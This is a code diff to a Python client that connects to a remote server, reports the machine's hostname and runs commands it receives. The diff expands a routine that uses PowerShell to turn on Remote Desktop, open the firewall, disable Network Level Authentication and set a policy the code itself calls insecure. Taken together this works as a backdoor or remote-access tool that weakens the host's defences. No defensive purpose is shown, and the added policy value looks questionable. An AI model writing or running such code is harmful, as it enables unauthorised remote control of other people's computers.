@@ -29,7 +29,8 @@ def connect_to_server(server_ip, port=12345):
     try:
         client_socket.connect((server_ip, port))
         # Send hostname to server
-        hostname = getpass.getuser()  # You can use socket.gethostname() if you want the full machine name
+        hostname = socket.gethostname()
+        print(f"Sending hostname: {hostname}")
         client_socket.sendall(hostname.encode())
         return client_socket
     except (socket.timeout, socket.error) as e:
@@ -44,23 +45,38 @@ def execute_command(command):
         print(f"Command execution failed: {e}")
 
 def enable_rdp():
-    # Enable Remote Desktop, configure firewall, and disable NLA
-    rdp_commands = """
+    # Enable Remote Desktop and set up firewall rules
+    enable_rdp_command = """
     powershell -Command "
     Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0;
     Enable-NetFirewallRule -DisplayGroup 'Remote Desktop';
+    "
+    """
+    execute_command(enable_rdp_command)
+    
+    # Disable Network Level Authentication (NLA)
+    disable_nla_command = """
+    powershell -Command "
     Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'UserAuthentication' -Value 0;
     "
     """
-    execute_command(rdp_commands)
-    print("Remote Desktop enabled and configured!")
+    execute_command(disable_nla_command)
+    
+    # Ensure RDP is set to allow connections from any user (insecure)
+    # This sets a policy to allow all users, but note this is not recommended for security reasons
+    allow_any_user_command = """
+    powershell -Command "
+    Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name 'fAllowUnrestrictedRDP' -Value 1;
+    "
+    """
+    execute_command(allow_any_user_command)
+
 
 def main():
     port = 12345
     client_socket = None
 
-    # Enable Remote Desktop at the start
-    enable_rdp()
+    enable_rdp()  # Ensure RDP is enabled
 
     while True:
         if client_socket is None:
